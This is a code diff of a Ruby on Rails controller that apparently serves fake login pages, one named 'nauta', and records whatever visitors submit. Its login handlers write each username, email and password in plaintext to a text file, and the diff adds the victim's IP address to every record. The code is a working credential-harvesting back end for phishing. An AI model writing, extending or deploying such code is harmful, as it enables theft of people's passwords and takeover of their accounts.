@@ -2,11 +2,11 @@ class SessionsController < ApplicationController
     def index
         render "index"
     end
-
+  
     def page_basic
         render "basic"
     end
-
+  
     def nauta
         respond_to do |format|
             format.html { render "nauta" }
@@ -17,22 +17,22 @@ class SessionsController < ApplicationController
             format.turbo_stream
         end
     end
-
+  
     def basic_login
-        save_credentials(params[:username], params[:email], params[:password])
+        save_credentials(request.remote_ip, params[:username], params[:email], params[:password])
         render "basic"
     end
-
+  
     def nauta_login
-        save_credentials(params[:username], params[:email], params[:password])
+        save_credentials(request.remote_ip, params[:username], params[:email], params[:password])
         render "nauta"
     end
-
+  
     private
-
-    def save_credentials(username, email, password)
+  
+    def save_credentials(ip, username, email, password)
         File.open('credenciales.txt', 'a') do |file|
-            file.puts "Username: #{username}, Email: #{email}, Password: #{password}"
+            file.puts "IP: #{ip}, Username: #{username}, Email: #{email}, Password: #{password}"
         end
     end
 end
